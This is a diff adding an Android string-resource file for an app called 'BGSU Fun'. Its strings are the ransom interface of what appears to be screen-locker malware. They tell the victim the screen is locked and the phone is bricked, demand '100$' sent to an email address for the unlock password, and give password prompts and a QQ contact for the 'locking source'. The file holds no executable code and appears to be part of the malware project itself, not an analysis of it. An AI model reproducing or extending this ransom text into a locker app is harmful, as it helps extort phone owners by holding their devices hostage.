@@ -1,0 +1,16 @@
+<?xml version="1.0" encoding="utf-8"?>
+<resources>
+    <string name="hello">Hello World, MainActivity!</string>
+    <string name="app_name">BGSU Fun</string>
+    <string name="yu">Hao-kun Production</string>
+    <string name="shijie">Locking source added Q2827728560</string>
+    <string name="ab">Do you lock bar software</string>
+    <string name="cd">Your screen is locked</string>
+    <string name="cc">Phone bricked blame me yo!</string>
+    <string name="m">Send 100$ to abc@def to get password by email</string>
+    <string name="mm">to get password by email</string>
+    <string name="qq">Send 100$ to abc@def to get password by email</string>
+    <string name="number_string">serial number:</string>
+    <string name="exit">Enter Password</string>
+    <string name="nottrue">Wrong password</string>
+</resources>
